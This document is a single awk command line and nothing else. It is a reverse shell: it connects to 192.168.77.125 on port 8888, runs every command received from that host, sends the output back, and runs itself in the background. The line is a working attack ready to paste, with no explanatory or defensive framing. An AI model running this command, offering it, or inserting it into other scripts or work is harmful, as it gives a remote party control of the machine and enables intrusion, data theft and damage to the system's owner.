awk 'BEGIN{s="/inet/tcp/0/192.168.77.125/8888";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &